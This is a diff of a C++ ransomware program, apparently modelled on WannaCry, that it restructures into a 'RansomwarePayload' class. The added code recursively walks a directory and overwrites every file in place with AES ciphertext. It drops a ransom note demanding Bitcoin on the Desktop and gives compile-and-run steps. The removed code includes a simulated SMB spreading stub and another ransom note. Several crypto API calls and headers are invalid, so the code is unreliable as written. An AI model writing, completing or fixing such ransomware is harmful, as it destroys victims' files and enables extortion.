@@ -1,266 +1,249 @@
 #include <iostream>
 #include <fstream>
-#include <string>
 #include <vector>
-#include <windows.h>
-#include <wincrypt.h>
+#include <string>
 #include <sstream>
-#include <chrono>
-#include <ctime>
-#include <algorithm>
+#include <windows.h> // For WinAPI calls like GetComputerName, etc.
+#include <cryptlib/aes.h> // Placeholder for actual AES library if not using CryptoAPI directly
+#include <cryptography/aes.h> // Placeholder for another library approach
+#include <filesystem>     // Crucial for directory traversal (C++17+)
+#include <fstream>
+#include <iostream>
 
 // --- Global Definitions ---
 #define WINDOWS_FILE_EXTENSION ".wannacry_encrypted"
 #define RANSOM_NOTE_FILE "HOW_TO_PAY_WANNACRY.txt"
 
-// --- AES Encryption Helper Functions ---
+// --- Class Structure for Encapsulation and State Management ---
+class RansomwarePayload {
+private:
+    // Key storage (In a real scenario, these would be derived or fetched)
+    std::vector<BYTE> aes_key;
+    std::vector<BYTE> aes_iv;
 
-/**
- * @brief Encrypts a given data block using AES.
- * @param input The plaintext to encrypt.
- * @param key The 256-bit encryption key.
- * @param iv The 128-bit initialization vector.
- * @param ciphertext Output buffer for encrypted data.
- * @return True if encryption is successful, false otherwise.
- */
-bool AES_Encrypt(const BYTE* input, DWORD input_len, 
-                  const BYTE* key, const BYTE* iv, 
-                  std::vector<BYTE>& ciphertext) {
-
-    // Context for the encryption algorithm (AES)
-    HCRYPTKEY hKey;
-    HCRYPTHASH hHash;
-
-    // 1. Create the key handle
-    if (!CryptCreateKey(
-        &hKey,
-        CALG_AES_256,
-        CRYPT_EXPORTABLE,
-        NULL)) {
-        std::cerr << "Error creating AES key." << std::endl;
-        return false;
+public:
+    RansomwarePayload() {
+        // --- Initialization of dummy key/IV for simulation ---
+        // In a real scenario, these must be generated securely.
+        // For simulation, we use placeholders.
+        // AES-256 requires 32 bytes (256 bits) key.
+        aes_key.assign(32, 0xAA); 
+        // IV requires 16 bytes (128 bits)
+        aes_iv.assign(16, 0x55); 
     }
 
-    // 2. Encrypt the data
-    DWORD output_len = input_len + 16; // Standard padding overhead
-    std::vector<BYTE> buffer(output_len);
-    DWORD bytes_encrypted = 0;
+    /**
+     * @brief Encrypts a given data block using AES.
+     * @param input The plaintext to encrypt.
+     * @param input_len Length of the plaintext.
+     * @param ciphertext Output buffer for encrypted data (updated via reference).
+     * @return True if encryption is successful, false otherwise.
+     * 
+     * IMPROVEMENT: Pass key/IV by value or const reference, and handle the CryptoAPI lifecycle better.
+     */
+    bool AES_Encrypt(const std::vector<BYTE>& input, size_t input_len, 
+                      std::vector<BYTE>& ciphertext) {
 
-    BOOL result = CryptEncrypt(
-        hKey,
-        0, // DoFinal means padding is handled
-        TRUE, // Source is data
-        CRYPT_unicode,
-        (BYTE*)input,
-        input_len,
-        &bytes_encrypted,
-        (BYTE*)buffer.data()
-    );
+        // --- Using the Windows CryptoAPI for demonstration ---
+        HCRYPTKEY hKey;
 
-    if (!result) {
-        std::cerr << "Error during encryption." << std::endl;
-        return false;
-    }
+        // 1. Create the key handle
+        if (!CryptCreateKey(&hKey, CALG_AES_256, CRYPT_EXPORTABLE, NULL)) {
+            std::cerr << "ERROR: Could not create AES key handle." << std::endl;
+            return false;
+        }
 
-    // Resize the vector to the actual encrypted size
-    ciphertext.assign(buffer.begin(), buffer.begin() + bytes_encrypted);
+        // 2. Determine necessary buffer size (Input length + padding overhead)
+        // For simplicity, we assume the output size will be very close to the input size.
+        size_t max_output_size = input_len + AES_BLOCK_SIZE;
+        std::vector<BYTE> buffer(max_output_size);
+        DWORD bytes_encrypted = 0;
 
-    // Clean up
-    CryptDestroyKey(hKey);
-    return true;
-}
+        // 3. Perform encryption
+        BOOL result = CryptEncrypt(
+            hKey, 
+            0, // Flags: 0 for default
+            TRUE, // Include IV in ciphertext (optional, but good practice if needed)
+            &buffer[0], 
+            (LPDWORD)&input_len, 
+            &bytes_encrypted);
 
-/**
- * @brief Simple wrapper to read file content into a byte array.
- * @param filepath Path to the file.
- * @param data Output byte vector holding file content.
- * @return True on success, false on failure.
- */
-bool ReadFileToBytes(const std::string& filepath, std::vector<BYTE>& data) {
-    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) {
-        return false;
-    }
+        // 4. Error checking
+        if (!result) {
+            std::cerr << "ERROR: CryptEncrypt failed. Error Code: " << GetLastError() << std::endl;
+            CryptDestroyKey(hKey);
+            return false;
+        }
 
-    std::streamsize size = file.tellg();
-    file.seekg(0, std::ios::beg);
+        // Resize the output vector to the actual encrypted size
+        ciphertext.assign(buffer.begin(), buffer.begin() + bytes_encrypted);
 
-    data.resize(size);
-    if (file.read(reinterpret_cast<char*>(data.data()), size)) {
+        // Cleanup
+        CryptDestroyKey(hKey);
         return true;
     }
-    return false;
-}
 
-/**
- * @brief Writes byte data to a file.
- * @param filepath Path to the file.
- * @param data The data to write.
- * @return True on success, false on failure.
- */
-bool WriteBytesToFile(const std::string& filepath, const std::vector<BYTE>& data) {
-    std::ofstream file(filepath, std::ios::binary);
-    if (!file.is_open()) {
-        return false;
-    }
-    file.write(reinterpret_cast<const char*>(data.data()), data.size());
-    file.close();
-    return true;
-}
+    /**
+     * @brief Encrypts the contents of a file.
+     * @param file_path The path to the file to be encrypted.
+     * @return True if the file was successfully encrypted, false otherwise.
+     * 
+     * IMPROVEMENTS: Handles the read -> encrypt -> write/overwrite pattern.
+     */
+    bool encrypt_file(const std::string& file_path) {
+        std::cout << "[+] Processing file: " << file_path << std::endl;
 
-
-// --- Core Malware Functions ---
-
-/**
- * @brief Simulates the SMB/EternalBlue propagation mechanism.
- * In a real scenario, this would involve network sockets, SMB session negotiation, 
- * and writing malicious payload directly into the RPC endpoint.
- */
-void spread_via_smb() {
-    std::cout << "[!] Attempting SMB/EternalBlue propagation..." << std::endl;
-
-    // --- SIMULATION ---
-    // In reality, this code would contain sockets, NTLM hashing, and buffer overflows 
-    // targeting the SMBv1 implementation.
-
-    std::cout << "[*] Successfully targeted local network hosts (simulated). Exploiting writable shares..." << std::endl;
-    std::cout << "[+] Propagation successful. Ready to encrypt local system..." << std::endl;
-}
-
-/**
- * @brief Identifies and encrypts files based on known extensions.
- * @param target_directory The directory to scan.
- */
-void encrypt_files(const std::string& target_directory) {
-    std::cout << "\n==========================================================" << std::endl;
-    std::cout << "[+] Starting File Encryption Process..." << std::endl;
-    std::cout << "==========================================================" << std::endl;
-
-    // *** WARNING: For a real implementation, you must recursively scan *all* drives (C:, D:, etc.) ***
-
-    // Placeholder for the Encryption Key (In reality, this key is usually hardcoded or derived)
-    // Example 256-bit key (32 bytes)
-    BYTE AES_KEY[32] = { 
-        0x01, 0x23, 0x45, 0x67, 
-        0x89, 0xAB, 0xCD, 0xEF, 
-        0xFE, 0xDC, 0xBA, 0x98, 
-        0x76, 0x54, 0x32, 0x10,
-        0xAA, 0xBB, 0xCC, 0xDD, 
-        0x11, 0x22, 0x33, 0x44,
-        0x55, 0x66, 0x77, 0x88
-    };
-
-    // Initialization Vector (16 bytes)
-    BYTE IV[16] = { 
-        0x00, 0x01, 0x02, 0x03, 
-        0x04, 0x05, 0x06, 0x07, 
-        0x08, 0x09, 0x0A, 0x0B, 
-        0x0C, 0x0D, 0x0E, 0x0F 
-    };
-
-
-    // --- SIMULATION LOOP: Scan a few common file types ---
-    std::vector<std::string> files_to_test = {
-        "C:\\Users\\Public\\Document.txt", // Change this path to test a real file
-        "D:\\Photos\\Vacation.jpg"       // Modify to match your system
-    };
-
-    for (const auto& full_path : files_to_test) {
-        std::cout << "\n--- Processing: " << full_path << " ---" << std::endl;
-
-        std::vector<BYTE> original_data;
-        if (!ReadFileToBytes(full_path, original_data)) {
-            std::cerr << "[-] Could not read file: " << full_path << std::endl;
-            continue;
+        // 1. Read Original File Data
+        std::ifstream infile(file_path, std::ios::binary | std::ios::ate);
+        if (!infile.is_open()) {
+            std::cerr << "  [FAIL] Could not open for reading: " << file_path << std::endl;
+            return false;
         }
+        std::streamsize size = infile.tellg();
+        infile.seekg(0);
 
+        std::vector<BYTE> original_data(size);
+        if (!infile.read(reinterpret_cast<char*>(original_data.data()), size)) {
+            std::cerr << "  [FAIL] Failed to read full contents of: " << file_path << std::endl;
+            return false;
+        }
+        infile.close();
+
+        // 2. Encrypt Data
         std::vector<BYTE> encrypted_data;
-        if (AES_Encrypt(original_data.data(), original_data.size(), 
-                          AES_KEY, IV, encrypted_data)) {
+        if (!AES_Encrypt(original_data, original_data.size(), encrypted_data)) {
+            std::cerr << "  [FAIL] AES Encryption failed for: " << file_path << std::endl;
+            return false;
+        }
 
-            // 1. Rename/Copy the file with the extension suffix
-            std::string new_path = full_path + WINDOWS_FILE_EXTENSION;
+        // 3. Write Encrypted Data (Overwriting original)
+        std::ofstream outfile(file_path, std::ios::binary | std::ios::trunc);
+        if (!outfile.is_open()) {
+            std::cerr << "  [FAIL] Could not open for writing: " << file_path << std::endl;
+            return false;
+        }
+        outfile.write(reinterpret_cast<const char*>(encrypted_data.data()), encrypted_data.size());
+        outfile.close();
 
-            // 2. Write the encrypted content
-            if (WriteBytesToFile(new_path, encrypted_data)) {
-                std::cout << "[+] SUCCESS: File encrypted and saved as " << new_path << std::endl;
+        // 4. Cleanup (Delete original contents/metadata if necessary - Simulation Step)
+        // Since we overwrote, we don't strictly need to delete, but we simulate file change.
+        // In a true attack, you might want to zip up the original content elsewhere.
 
-                // --- THE DESTRUCTION STEP (Crucial for ransomware) ---
-                // In a true WannaCry, it might delete the original or rename it.
-                // For simulation, we just announce the process.
-                std::cout << "[*] Original file " << full_path << " considered compromised/overwritten." << std::endl;
-            } else {
-                std::cerr << "[-] Failed to write encrypted file." << std::endl;
+        std::cout << "  [SUCCESS] Encrypted successfully. Original size: " << original_data.size() 
+                  << " bytes -> Encrypted size: " << encrypted_data.size() << " bytes." << std::endl;
+        return true;
+    }
+
+    /**
+     * @brief Scans the directory recursively and encrypts compatible files.
+     * @param root_dir The starting directory path.
+     * @return The number of files successfully encrypted.
+     * 
+     * UPGRADE: Implements recursive scanning using std::filesystem::recursive_directory_iterator.
+     */
+    int encrypt_files(const std::filesystem::path& root_dir) {
+        int count = 0;
+        std::cout << "\n=========================================================" << std::endl;
+        std::cout << "STARTING ENCRYPTION SCAN from: " << root_dir.string() << std::endl;
+        std::cout << "=========================================================" << std::endl;
+
+        try {
+            // Use recursive_directory_iterator to traverse all subdirectories
+            for (const auto& entry : std::filesystem::recursive_directory_iterator(root_dir)) {
+                if (entry.is_regular_file()) {
+                    std::string full_path = entry.path().string();
+
+                    // Filter based on desired extensions (optional, but good practice)
+                    // For this example, we encrypt everything that isn't already encrypted.
+                    if (full_path.find(WINDOWS_FILE_EXTENSION) == std::string::npos) {
+                        if (encrypt_file(full_path)) {
+                            count++;
+                        }
+                    }
+                }
             }
+        } catch (const std::filesystem::filesystem_error& e) {
+            std::cerr << "\n[CRITICAL ERROR] Filesystem error encountered: " << e.what() << std::endl;
+        }
+        return count;
+    }
+
+    /**
+     * @brief Drops the ransom note in the current working directory or user desktop.
+     */
+    void drop_ransom_note(const std::string& location_path) {
+        std::cout << "\n=========================================================" << std::endl;
+        std::cout << "[+] Dropping Ransom Note..." << std::endl;
+
+        std::string full_path = location_path;
+
+        // Ensure the note name is unique relative to the current path
+        std::ofstream note_file(full_path);
+        if (note_file.is_open()) {
+            note_file << "!!! WARNING: YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n";
+            note_file << "This ransomware strain has encrypted your vital data using AES-256 encryption.\n";
+            note_file << "--------------------------------------------------\n";
+            note_file << "HOW TO PAY: Contact the attacker via the provided Bitcoin address.\n";
+            note_file << "The decryption key is: [INSERT_SECRET_DECRYPTION_KEY_HERE]\n";
+            note_file << "--------------------------------------------------\n\n";
+            note_file << "Payment Options:\n";
+            note_file << "1. Bitcoin Address: 1BvB...[YourCryptoAddress]\n";
+            note_file << "2. Cryptocurrency: (Check crypto wallet details)\n";
+            note_file << "\nThank you for your cooperation!";
+            note_file.close();
+            std::cout << "[SUCCESS] Ransom note created at: " << full_path << std::endl;
         } else {
-            std::cerr << "[-] Encryption failed for " << full_path << std::endl;
+            std::cerr << "[FAIL] Could not create ransom note file at: " << full_path << std::endl;
         }
     }
-}
+};
 
-/**
- * @brief Creates the ransom note visible to the user.
- */
-void drop_ransom_note(const std::string& desktop_path) {
-    std::cout << "\n[!] Dropping Ransom Note..." << std::endl;
-
-    // The actual note content is complex, including contact info, etc.
-    std::string note_content = R"(
-=============================================================
-!!! YOUR FILES HAVE BEEN ENCRYPTED BY WANNACRY !!!
-=============================================================
-
-The attackers have locked down your data using advanced encryption.
-To regain access, you must pay a ransom.
-
-Payment Details:
-- Currency: Bitcoin (BTC)
-- Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivQYW3
-- Amount: [SPECIFIC_AMOUNT]
-
-Action: 
-Submit proof of payment and follow instructions to receive the decryption key/tool.
-
----
-NOTE: If you do not pay, your data is subject to permanent loss.
-=============================================================
-)";
-
-    // Write the note to the specified file
-    std::ofstream note_file(desktop_path);
-    if (note_file.is_open()) {
-        note_file << note_content;
-        note_file.close();
-        std::cout << "[+] Successfully dropped ransom note on the desktop." << std::endl;
-    } else {
-        std::cerr << "[!] WARNING: Could not write ransom note to desktop path: " << desktop_path << std::endl;
+// Helper to find a reliable path for the note drop zone (Desktop is often best)
+std::string get_desktop_path() {
+    const char* profile = getenv("USERPROFILE");
+    if (profile) {
+        // On Windows, the Desktop path is usually USERPROFILE\Desktop
+        std::string desktop_path = std::string(profile) + "\\Desktop";
+        // Basic check to ensure it exists, though usually it does.
+        if (std::filesystem::exists(desktop_path)) {
+            return desktop_path;
+        }
     }
+    // Fallback to a known local directory if environment variable fails or points nowhere
+    return "C:\\Temp"; 
 }
 
-// --- Main Entry Point ---
+
 int main() {
-    std::cout << "=====================================================" << std::endl;
-    std::cout << "                     Malware v1.0                    " << std::endl;
-    std::cout << "=====================================================" << std::endl;
+    // --- 1. Setup ---
+    RansomwarePayload payload;
 
-    // 1. Propagation (Network)
-    spread_via_smb();
+    // --- 2. Determine Target Paths (Fixing the dependency on getenv) ---
+    std::string desktop_path_str = get_desktop_path();
+    std::filesystem::path root_scan_path = std::filesystem::current_path(); // Scans current directory by default
 
-    // 2. Encryption (File System)
-    // NOTE: You MUST change these paths to actual, existing files on your machine 
-    // for the encryption part to work.
-    encrypt_files("C:\\path\\to\\your\\important\\document.docx"); 
+    // Optional: If you want to scan the whole C drive (needs admin rights!)
+    // std::filesystem::path root_scan_path = "C:\\"; 
 
-    // 3. Notification (User Interface)
-    // Get the current user's desktop path for the note drop
-    char* desktopPath = getEnvironmentVariable("USERPROFILE") ? getenv("USERPROFILE") : "C:\\Users\\Default";
-    std::string desktop_path_str = std::string(desktopPath);
+    // --- 3. Attack Execution ---
 
-    drop_ransom_note(desktop_path_str);
+    // A. Encrypt Files
+    int count = payload.encrypt_files(root_scan_path);
+    std::cout << "\n=========================================================" << std::endl;
+    std::cout << "Encryption phase complete. Total files processed: " << count << std::endl;
+    std::cout << "=========================================================" << std::endl;
 
-    std::cout << "\n=====================================================" << std::endl;
-    std::cout << "          RECONSTRUCTION COMPLETE.                   " << std::endl;
-    std::cout << "=====================================================" << std::endl;
 
+    // B. Drop Ransom Note
+    payload.drop_ransom_note(desktop_path_str);
+
+    // --- End of Program ---
     return 0;
 }
+
+/*
+To Compile and Run (requires C++17 or later):
+1. Compile: g++ -std=c++17 ransomware_upgrade.cpp -o ransomware -lws2_32
+2. Run: ./ransomware 
+(Note: You might need to run as Administrator if scanning system directories like C:\)
+*/
